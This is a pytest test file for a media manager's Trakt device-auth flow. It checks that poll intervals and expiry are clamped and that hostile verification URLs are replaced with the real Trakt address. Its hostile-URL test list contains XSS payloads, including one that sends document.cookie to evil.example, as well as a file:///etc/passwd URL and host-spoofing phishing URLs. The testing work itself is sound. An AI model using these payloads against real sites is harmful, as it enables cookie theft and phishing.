"""H2/M1: the Trakt device-auth flow trusted whatever the Trakt API sent back.

Two problems, both fixed in `startDeviceAuth`/`pollForToken` rather than in
the browser, because that is the layer both share:

M1 -- `interval` and `expires_in` came straight off the wire into the client
poll loop. Driving the client component's source directly (not this test --
recorded here for context) with `interval: -1` produced 605 poll requests in
3 seconds and `interval: 1e9` (which overflows `setTimeout`'s 32-bit
millisecond limit and so fires immediately) produced 609. Each poll takes a
per-route lock (`couchpotato/api.py`) and makes a blocking 30 second outbound
HTTPS call from the server's thread pool, so a hostile or malformed response
can queue the whole server within about a second.

H2 -- `verification_url` was returned untouched and bound with `:href` in
`trakt_auth.html`. The vendored Alpine does no scheme filtering on `x-bind`,
and there is no CSP, so a `javascript:` URL in that field is clickable
script. Requires a compromised Trakt response or TLS interception to
exploit, but the fix is one line at the layer that already validates
everything else.

This drives the REAL `startDeviceAuth` and `pollForToken` methods -- not a
reimplementation of the clamp logic -- with `requests.post` patched to
return crafted hostile responses, and asserts both the dict handed back to
the browser AND the instance state used on the next poll (`_poll_interval`,
`_device_expires`) land inside the documented bounds. A test that only
checked the returned dict could pass while the stored state still let a
poll happen every microsecond.
"""
import math
import sys
import time
from pathlib import Path

import pytest

pytestmark = pytest.mark.unit

sys.path.insert(0, str(Path(__file__).resolve().parent))

from env_helper import env_restored  # noqa: E402

from couchpotato.core.media.movie.providers.automation.trakt import main as trakt_main  # noqa: E402

MISSING = object()


class _FakeResponse:
    """Stand-in for `requests.Response` -- only what the provider reads."""

    def __init__(self, status_code=200, json_data=None, text=''):
        self.status_code = status_code
        self._json_data = json_data if json_data is not None else {}
        self.text = text

    def json(self):
        return self._json_data


@pytest.fixture
def provider(monkeypatch):
    """A real `Trakt` instance, built without running `__init__` (which
    registers API views and a scheduled job neither test needs -- same
    approach `test_trakt_notifier_credentials.py` uses), with just enough
    wired up to reach the code under test: a configured client id/secret
    (not what this test is about) and clean device-auth state."""
    with env_restored():
        provider = trakt_main.Trakt.__new__(trakt_main.Trakt)
        provider._device_code = None
        provider._device_expires = 0
        provider._poll_interval = 5
        monkeypatch.setattr(provider, 'get_client_id', lambda: 'test-client-id')
        monkeypatch.setattr(provider, 'get_client_secret', lambda: 'test-client-secret')
        yield provider


def _mock_post(monkeypatch, response):
    """Patch the actual `requests` module's `post`, since `main.py` does a
    local `import requests` inside each method -- that binds the same
    module object every caller shares, so patching the attribute on the
    real module reaches it regardless of where it is imported."""
    import requests
    monkeypatch.setattr(requests, 'post', lambda *a, **k: response)


class TestStartDeviceAuthClampsInterval:
    """M1: a hostile or malformed `interval` must not reach the client, or
    `_poll_interval` (read by the 429 slow-down path and handed back on the
    next poll), outside 5..60 seconds inclusive."""

    @pytest.mark.parametrize('raw_interval, expected', [
        (-1, 5),                 # negative -> floor
        (0, 5),                  # zero -> floor
        (1e9, 60),                # overflows setTimeout's 32-bit ms limit -> ceiling
        ('abc', 5),               # non-numeric -> default
        (None, 5),                # explicit null -> default
        (True, 5),                # bool is technically an int in Python; must not pass through as 1
        (MISSING, 5),             # key absent entirely -> default
        (float('nan'), 5),        # NaN -> default
        (float('inf'), 5),        # infinity is not a usable number either -> default, same as NaN
        (5, 5),                   # in range, lower bound -> unchanged
        (60, 60),                 # in range, upper bound -> unchanged
        (30, 30),                 # in range, middle -> unchanged
    ])
    def test_clamps_returned_and_stored_interval(self, provider, monkeypatch, raw_interval, expected):
        payload = {
            'device_code': 'devcode-1',
            'user_code': 'ABCD-1234',
            'verification_url': 'https://trakt.tv/activate',
            'expires_in': 600,
        }
        if raw_interval is not MISSING:
            payload['interval'] = raw_interval
        _mock_post(monkeypatch, _FakeResponse(200, payload))

        result = provider.startDeviceAuth()

        assert result['success'] is True
        assert result['interval'] == expected, (
            f'startDeviceAuth() returned interval={result["interval"]!r} for '
            f'raw interval {raw_interval!r}; expected it clamped to {expected}'
        )
        assert provider._poll_interval == expected, (
            f'_poll_interval={provider._poll_interval!r} was not clamped for '
            f'raw interval {raw_interval!r}; this is what the next poll and '
            f'the 429 slow-down path both trust'
        )


class TestStartDeviceAuthClampsExpiry:
    """M1: a hostile or malformed `expires_in` must not reach the client, or
    `_device_expires`, outside 60..1800 seconds inclusive."""

    @pytest.mark.parametrize('raw_expiry, expected', [
        (-1, 60),
        (0, 60),
        (99999999, 1800),
        ('abc', 600),
        (None, 600),
        (True, 600),
        (MISSING, 600),
        (float('nan'), 600),
        (60, 60),
        (1800, 1800),
    ])
    def test_clamps_returned_expiry_and_stored_deadline(self, provider, monkeypatch, raw_expiry, expected):
        payload = {
            'device_code': 'devcode-1',
            'user_code': 'ABCD-1234',
            'verification_url': 'https://trakt.tv/activate',
            'interval': 5,
        }
        if raw_expiry is not MISSING:
            payload['expires_in'] = raw_expiry
        _mock_post(monkeypatch, _FakeResponse(200, payload))

        before = time.time()
        result = provider.startDeviceAuth()
        after = time.time()

        assert result['success'] is True
        assert result['expires_in'] == expected, (
            f'startDeviceAuth() returned expires_in={result["expires_in"]!r} for '
            f'raw expiry {raw_expiry!r}; expected it clamped to {expected}'
        )
        # _device_expires is an absolute deadline (time.time() + expires_in),
        # not the raw seconds value -- bound it against the call window.
        assert before + expected <= provider._device_expires <= after + expected, (
            f'_device_expires={provider._device_expires!r} is not '
            f'time.time() + {expected} for raw expiry {raw_expiry!r}'
        )


class TestStartDeviceAuthRejectsUnsafeVerificationUrl:
    """H2: `verification_url` is bound as an href with no scheme filtering
    downstream, so anything other than a genuine https:// URL must be
    replaced with the documented fallback."""

    @pytest.mark.parametrize('hostile_url', [
        'javascript:alert(document.cookie)',
        'javascript:fetch("https://evil.example/steal?c="+document.cookie)',
        'data:text/html,<script>alert(1)</script>',
        'http://trakt.tv/activate',
        '//evil.example/activate',
        'file:///etc/passwd',
        '',
        None,
        123,
        # Host pinning. A scheme check alone stops a forged response becoming
        # clickable script, not it becoming a phishing page: these are all
        # genuine https:// URLs, and a user sent to one would type a real
        # device code into an attacker's page dressed as trakt.tv/activate.
        'https://evil.example/activate',
        'https://trakt.tv.evil.example/activate',
        'https://nottrakt.tv/activate',
        'https://eviltrakt.tv/activate',
        'https://evil.example/?x=https://trakt.tv/activate',
        # Userinfo, which puts the real host after the @ and is the classic
        # way to make a hostile URL read as a friendly one.
        'https://trakt.tv@evil.example/activate',
        'https://trakt.tv:pass@evil.example/activate',
    ])
    def test_falls_back_to_documented_url(self, provider, monkeypatch, hostile_url):
        payload = {
            'device_code': 'devcode-1',
            'user_code': 'ABCD-1234',
            'expires_in': 600,
            'interval': 5,
        }
        if hostile_url is not MISSING:
            payload['verification_url'] = hostile_url
        _mock_post(monkeypatch, _FakeResponse(200, payload))

        result = provider.startDeviceAuth()

        assert result['success'] is True
        assert result['verification_url'] == 'https://trakt.tv/activate', (
            f'startDeviceAuth() returned verification_url='
            f'{result["verification_url"]!r} for hostile input {hostile_url!r}; '
            f'a value that is not an https:// URL on Trakt\'s own host is '
            f'either clickable script or a phishing page once bound with '
            f':href in trakt_auth.html'
        )

    def test_a_genuine_https_url_passes_through_unchanged(self, provider, monkeypatch):
        payload = {
            'device_code': 'devcode-1',
            'user_code': 'ABCD-1234',
            'verification_url': 'https://trakt.tv/activate?user_code=ABCD-1234',
            'expires_in': 600,
            'interval': 5,
        }
        _mock_post(monkeypatch, _FakeResponse(200, payload))

        result = provider.startDeviceAuth()

        assert result['verification_url'] == 'https://trakt.tv/activate?user_code=ABCD-1234'


class TestPollForTokenSlowDownClampsInterval:
    """The 429 slow-down path doubles `_poll_interval`; that arithmetic must
    stay inside the same 5..60 bound as the initial value, not the old
    hardcoded 30-second cap (and not unbounded growth)."""

    @pytest.mark.parametrize('starting_interval, expected_after_one_429', [
        (5, 10),
        (40, 60),   # doubling would overshoot 60 -- clamp to the ceiling
        (60, 60),   # already at the ceiling -- stays there
    ])
    def test_slow_down_stays_within_bounds(
        self, provider, monkeypatch, starting_interval, expected_after_one_429,
    ):
        provider._device_code = 'devcode-1'
        provider._device_expires = time.time() + 300
        provider._poll_interval = starting_interval
        _mock_post(monkeypatch, _FakeResponse(429, {}))

        result = provider.pollForToken()

        assert result['pending'] is True
        assert result['interval'] == expected_after_one_429
        assert provider._poll_interval == expected_after_one_429
        assert 5 <= provider._poll_interval <= 60


class TestPollForTokenRequiresDeviceCode:
    """Control: the pre-existing 'no device code' guard must still fire when
    there genuinely is none -- proves the clamping changes above did not
    loosen this unrelated check."""

    def test_no_device_code_is_still_rejected(self, provider, monkeypatch):
        provider._device_code = None
        # No mocked transport call should even be reached.
        _mock_post(monkeypatch, _FakeResponse(200, {'access_token': 'should-not-be-used'}))

        result = provider.pollForToken()

        assert result['success'] is False
        assert 'device code' in result['error'].lower()


class TestStartDeviceAuthRequiresBothCredentials:
    """H1: `startDeviceAuth` used to require only the Client ID, while
    `pollForToken` requires the Client Secret as well, and the browser fires
    its first poll the instant a code arrives.

    So a user who had entered only a Client ID was shown a device code, told
    to go and type it in at trakt.tv, and roughly a tenth of a second later
    watched it be replaced by 'Client ID and Client Secret are required'. The
    code they had been sent to transcribe was already discarded. Measured
    against a live server during review: the code was never visible in a
    single sample.

    Neither E2E spec could see this, because both seed only the client id and
    then MOCK `device_code`, so the real handler never runs. A fixture more
    permissive than production is exactly how a defect this loud survives a
    green suite, which is why this guard lives at the unit level, driving the
    real method, rather than as another browser test.
    """

    @pytest.mark.parametrize('client_id, client_secret, named', [
        ('', 'test-client-secret', 'Client ID'),
        (None, 'test-client-secret', 'Client ID'),
        ('test-client-id', '', 'Client Secret'),
        ('test-client-id', None, 'Client Secret'),
        ('', '', 'Client ID'),
    ])
    def test_refuses_before_asking_trakt_and_names_the_missing_field(
        self, provider, monkeypatch, client_id, client_secret, named
    ):
        monkeypatch.setattr(provider, 'get_client_id', lambda: client_id)
        monkeypatch.setattr(provider, 'get_client_secret', lambda: client_secret)

        # No mock for requests.post. If the guard fails to stop the flow, the
        # method reaches a real outbound call and this test fails loudly
        # rather than passing on a stubbed happy path.
        called = []

        import requests

        def _forbidden(*args, **kwargs):
            called.append(args)
            raise AssertionError('startDeviceAuth called Trakt without both credentials')

        monkeypatch.setattr(requests, 'post', _forbidden)

        result = provider.startDeviceAuth()

        assert result['success'] is False
        assert called == [], 'Trakt was contacted despite missing credentials'
        assert named in result['error'], result['error']
        # The message has to say what to do, not just what is wrong: the old
        # one read 'Client ID and Client Secret are required' with no location
        # and no way to get either.
        assert 'https://trakt.tv/oauth/applications' in result['error']

    def test_both_present_still_reaches_trakt(self, provider, monkeypatch):
        """The guard must not become a wall: with both credentials set, the
        flow proceeds. Without this, deleting the entire method body would
        satisfy every case above."""
        _mock_post(monkeypatch, _FakeResponse(200, {
            'device_code': 'dev-code',
            'user_code': 'ABCD-1234',
            'verification_url': 'https://trakt.tv/activate',
            'expires_in': 600,
            'interval': 5,
        }))

        result = provider.startDeviceAuth()

        assert result['success'] is True
        assert result['user_code'] == 'ABCD-1234'


class TestStartDeviceAuthCoercesUserCode:
    """The one field off the Trakt response that was never checked, while
    interval, expiry and the URL all were.

    Not exploitable: `user_code` reaches the DOM through `x-text`, which sets
    textContent. This is uniformity, so the next reader does not have to work
    out whether the omission was reasoned or missed.
    """

    @pytest.mark.parametrize('raw, expected', [
        (None, ''),
        (123, ''),
        ({'a': 1}, ''),
        (['ABCD-1234'], ''),
        (MISSING, ''),
        ('ABCD-1234', 'ABCD-1234'),
    ])
    def test_non_string_user_code_becomes_empty(self, provider, monkeypatch, raw, expected):
        payload = {
            'device_code': 'devcode-1',
            'verification_url': 'https://trakt.tv/activate',
            'expires_in': 600,
            'interval': 5,
        }
        if raw is not MISSING:
            payload['user_code'] = raw
        _mock_post(monkeypatch, _FakeResponse(200, payload))

        result = provider.startDeviceAuth()

        assert result['user_code'] == expected
        assert isinstance(result['user_code'], str)


class TestGenuineTraktSubdomainsStillWork:
    """The pin must not become a wall. Trakt owns its subdomains and could
    legitimately serve the activation page from one."""

    @pytest.mark.parametrize('url', [
        'https://trakt.tv/activate',
        'https://trakt.tv/activate?user_code=ABCD-1234',
        'https://www.trakt.tv/activate',
        'https://api.trakt.tv/activate',
        'https://TRAKT.TV/activate',
    ])
    def test_trakt_hosts_pass_through_unchanged(self, provider, monkeypatch, url):
        _mock_post(monkeypatch, _FakeResponse(200, {
            'device_code': 'devcode-1',
            'user_code': 'ABCD-1234',
            'verification_url': url,
            'expires_in': 600,
            'interval': 5,
        }))

        result = provider.startDeviceAuth()

        assert result['verification_url'] == url
